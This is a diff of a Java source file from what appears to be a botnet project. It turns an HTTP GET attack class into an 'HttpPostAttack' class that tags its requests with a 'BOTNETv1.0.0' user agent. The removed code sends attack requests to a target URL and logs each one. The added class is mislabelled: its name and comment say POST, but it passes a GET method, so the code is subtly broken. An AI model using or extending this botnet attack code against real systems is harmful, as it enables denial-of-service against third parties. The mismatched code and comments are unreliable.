@@ -24,43 +24,27 @@
   THE SOFTWARE.
  */
 
-package com.acmutv.botnet.core.attack;
+package com.acmutv.botnet.core.attack.http;
 
 import com.acmutv.botnet.core.target.HttpTarget;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-
-import java.io.IOException;
-import java.net.*;
-import java.util.Random;
+import com.acmutv.botnet.tool.net.HttpMethod;
 
 /**
- * This class realizes a HTTP GET attack.
+ * This class realizes a HTTP HTTP_POST attack.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
  * @see HttpAttack
  */
-public class HttpGetAttack extends HttpAttack {
+public class HttpPostAttack extends HttpAttack {
 
-  private static final Logger LOGGER = LogManager.getLogger(HttpAttack.class);
-
-  public HttpGetAttack(HttpTarget target, Random rndgen) {
-    super(target, rndgen);
-  }
-
-  public HttpGetAttack(HttpTarget target) {
-    super(target, new Random());
-  }
-
-  public void makeAttack(final URL url) throws IOException {
-    LOGGER.traceEntry("url={}", url);
-    HttpURLConnection http = (HttpURLConnection) url.openConnection();
-    http.setRequestMethod("GET");
-    http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
-    int response = http.getResponseCode();
-
-    LOGGER.info("HTTP-ATTACK :: GET {} :: {}", url, response);
+  /**
+   * Initializes the attacker.
+   * @param target the target to attack.
+   */
+  public HttpPostAttack(HttpTarget target) {
+    super(HttpMethod.GET, target);
+    super.getProperties().put("User-Agent", "BOTNETv1.0.0");
   }
 
 }
